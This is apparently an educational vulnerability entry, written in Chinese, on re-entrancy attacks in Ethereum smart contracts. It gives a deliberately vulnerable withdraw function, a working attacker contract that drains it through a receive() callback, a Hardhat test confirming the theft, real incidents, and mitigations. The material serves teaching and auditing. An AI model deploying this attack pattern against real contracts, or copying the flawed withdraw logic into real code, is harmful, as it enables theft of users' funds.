# 重入攻击



**漏洞名称：** 重入攻击 (Re-entrancy Attack)

**风险等级：** 高 

**漏洞描述：**

在以太坊中，如果一个合约A向另一个合约B发送ETH，合约B接收后可以执行一个回调函数。该回调函数可以调用反过来调用合约A的外部接口。此时合约A的原函数未执行完毕，然后又重新进入执行，因此叫重入。当合约状态更改不合理时，可能出现预期外的结果。重入攻击并不只是重入转移ETH的函数，而是可以重入所有合法的外部接口。通常重入攻击发生在向合约转移ETH和转移可以执行回调的代币（例如ERC721，ERC1155或者ERC677等）。在以太坊的开发中，重入攻击是一个必须重视的风险。



**示例代码语言：** Solidity

**漏洞示例代码：**

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.4;

contract ReEntrancyDemo {
    mapping(address => uint) public user_amounts;

    function deposit() external payable {
        user_amounts[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint value = user_amounts[msg.sender];
        require(value > 0, "zero value");
        (bool success,) = msg.sender.call{value : value}("");
        require(success, "E05");
        user_amounts[msg.sender] = 0;
    }
}

contract AttackDemo {
    bool once = false;
    function deposit(address target) external payable {
        require(msg.value == 1 ether, "E01");
        ReEntrancyDemo(target).deposit{value : msg.value}();
    }

    function withdraw(address target) external {
        uint balance_before = address(this).balance;
        assert(balance_before == 0);
        ReEntrancyDemo(target).withdraw();
        uint balance_after = address(this).balance;
        assert(balance_after == 2 ether);
    }
		
    receive() external payable {
        if(!once) {
            once = true;
            // Re-entrancy Attack
            ReEntrancyDemo(msg.sender).withdraw();
        }
    }
}
```



**示例代码简介：**

在上面的代码中，攻击者先调用`withdraw`函数进行提币操作，此时目标合约会向攻击合约发送ETH，并回调攻击合约的`receive`函数。在该函数中，又调用了目标合约的`withdraw`函数（重入就是指这个过程）。由于此时目标合约的`user_amounts[msg.sender]`并未修改为0，仍然可以通过验证。第二次提币发生后，相应的数值修改为0，此时无法现进行提币操作。

`once`状态变量的目的是限定重入次数，防止gas超限或者目标使用资金不足而交易失败。



**单元测试代码：**

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("ReEntrancyDemo Test", function () {
    let target;
    let instance;
    let owner,user1,user2,users;

    beforeEach( async function() {
        let ReEntrancyDemo = await ethers.getContractFactory("ReEntrancyDemo");
        target = await ReEntrancyDemo.deploy();
        let AttackDemo = await ethers.getContractFactory("AttackDemo");
        instance = await AttackDemo.deploy();
        [owner,user1,user2,...users] = await ethers.getSigners();
    })
    
    describe('attack test', () => { 
        let value = ethers.utils.parseEther("1.0")
        it("attack test", async () => {
            await target.connect(user1).deposit({value});
            await instance.deposit(target.address,{value});
            expect(await ethers.provider.getBalance(target.address)).to.be.equal(value.mul(2));
            await instance.withdraw(target.address);
            expect(await ethers.provider.getBalance(target.address)).to.be.equal(0);
        });
    })
});
```





**真实案例：**

以太坊上一个参考Compound的借贷项目 Rari Capital 遭受重入攻击，损失达7921万美元。该攻击利用了cEther.sol中转移ETH来执行接受合约回调函数的功能重入了其它函数，造成了资产损失。另外，也有其它类似Compound的项目受到重入攻击的案例，例如Gnosis区块链上的借贷项目 Agave 遭遇了ERC677回调重入攻击。重入攻击是开发者必须重视并且反复检查的问题。



**相关建议：**

1. 遵循Solidity一般安全原则 ，先检查状态，再改变状态，最后才是对外交互。
2. 如有必要，将所有的对外接口均添加防重入锁。
3. 使用transfer而不是call来发送ETH。
4. 在涉及ERC721,ERC1155及ERC677时格外小心，假定对方是恶意合约进行回调，模拟运行看会产生什么后果。
5. 咨询专业的安全审计公司进行合约代码审计。